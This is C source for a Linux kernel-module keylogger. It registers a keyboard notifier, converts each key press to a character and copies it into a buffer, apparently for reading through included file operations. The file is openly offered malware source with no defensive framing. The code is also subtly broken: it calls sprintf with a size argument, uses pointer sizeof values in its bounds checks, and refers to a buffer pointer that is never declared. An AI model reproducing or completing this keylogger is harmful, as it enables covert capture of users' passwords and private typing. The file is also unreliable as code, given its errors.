#ifndef KEYLOGGER
#define KEYLOGGER
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/kernel.h>
#include "keys.h"
#include "fops.c"
#define BUFF_SIZE 0x1000
char msg_Ptr_size[BUFF_SIZE];

void update_key(struct keyboard_notifier_param *p)
{
    char *tav;  
    if (p->shift){
        /*hundle as shift*/
        tav = keycode[p->value][1];
    }
    else
    {
        tav = keycode[p->value][0];
    }
    if(sizeof(msg_Ptr)+sizeof(tav) < sizeof(char)*BUFF_SIZE){
        *(msg_Ptr++) = *tav;
    }
}
void keycode_to_string(int key_press, int shift, char *buff)
{

    char *tav;  
    if (shift)
    {
        /*hundle as shift*/
        tav = keycode[key_press][1];
    }
    else
    {
        tav = keycode[key_press][0];
    }
        sprintf(buff, (char)BUFF_SIZE, "%s",tav);
    
    
}
int notifier(struct notifier_block *block, unsigned long code, void *p)
{
    struct keyboard_notifier_param *param =(struct keyboard_notifier_param*) p;
    size_t len;
    char keybuffer[BUFF_SIZE] = {0};

    if (!(param->down))
        return NOTIFY_OK;

    if (code == KBD_KEYCODE)
    {
        keycode_to_string(param->value, param->shift, keybuffer) ;  
        if (strlen(keybuffer)> 0)
        {
            if(sizeof(msg_Ptr)+sizeof(keybuffer) < sizeof(char)*BUFF_SIZE){
                strncpy(msg_Ptr, keybuffer, strlen(keybuffer));
            }
            /*else
            {
                msg_Ptr=
            }*/
                    
        }

        //update_key(param);
    }
    return NOTIFY_OK;
}
#endif